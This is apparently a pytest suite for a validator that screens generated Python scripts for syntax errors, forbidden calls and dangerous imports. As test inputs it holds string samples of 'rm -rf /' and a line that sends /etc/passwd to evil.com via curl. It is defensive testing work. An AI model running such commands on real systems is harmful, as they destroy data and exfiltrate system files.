"""
Test suite for script validation system.
"""

import pytest
import ast

def test_script_validator_creation():
    """Test ScriptValidator creation."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    assert validator is not None


def test_validate_syntax_valid_script():
    """Test syntax validation with valid script."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    valid_script = """
import json
import sys

def main():
    result = {"test": "value"}
    print(json.dumps(result))

if __name__ == "__main__":
    main()
"""

    is_valid, errors = validator.validate_syntax(valid_script)
    assert is_valid is True
    assert len(errors) == 0


def test_validate_syntax_invalid_script():
    """Test syntax validation with invalid script."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    invalid_script = """
import json
def main(:  # Syntax error here
    result = {"test": "value"}
    print(json.dumps(result))
"""

    is_valid, errors = validator.validate_syntax(invalid_script)
    assert is_valid is False
    assert len(errors) > 0
    assert "syntax error" in errors[0].lower()


def test_check_forbidden_patterns_safe_script():
    """Test forbidden pattern detection with safe script."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    safe_script = """
import json
import pandas as pd
import numpy as np

def calculate_stats(data):
    return data.mean()
"""

    violations = validator.check_forbidden_patterns(safe_script)
    assert len(violations) == 0


def test_check_forbidden_patterns_dangerous_script():
    """Test forbidden pattern detection with dangerous script."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    dangerous_script = """
import os
import subprocess

os.system('rm -rf /')
subprocess.call(['rm', '-rf', '/'])
"""

    violations = validator.check_forbidden_patterns(dangerous_script)
    assert len(violations) > 0
    assert any('os.system' in v for v in violations)
    assert any('subprocess' in v for v in violations)


def test_validate_imports_safe():
    """Test import validation with safe imports."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    safe_script = """
import json
import sys
import pandas as pd
import numpy as np
from scipy import stats
"""

    tree = ast.parse(safe_script)
    is_valid, violations = validator.validate_imports(tree)
    assert is_valid is True
    assert len(violations) == 0


def test_validate_imports_dangerous():
    """Test import validation with dangerous imports."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    dangerous_script = """
import os
import subprocess
import socket
"""

    tree = ast.parse(dangerous_script)
    is_valid, violations = validator.validate_imports(tree)
    assert is_valid is False
    assert len(violations) > 0


def test_full_validation_safe_script():
    """Test full validation process with safe script."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    safe_script = """
import json
import pandas as pd

def analyze_data(df):
    return {
        'mean': df.mean().to_dict(),
        'count': len(df)
    }

def main():
    data = json.loads(sys.stdin.read())
    df = pd.DataFrame(data)
    result = analyze_data(df)
    print(json.dumps(result))

if __name__ == "__main__":
    main()
"""

    is_valid, violations = validator.validate_script(safe_script)
    assert is_valid is True
    assert len(violations) == 0


def test_full_validation_dangerous_script():
    """Test full validation process with dangerous script."""
    from src.generators.validator import ScriptValidator

    validator = ScriptValidator()
    dangerous_script = """
import os
import subprocess

def malicious_function():
    os.system('curl http://evil.com/steal?data=' + open('/etc/passwd').read())
    subprocess.call(['rm', '-rf', '/'])

malicious_function()
"""

    is_valid, violations = validator.validate_script(dangerous_script)
    assert is_valid is False
    assert len(violations) > 0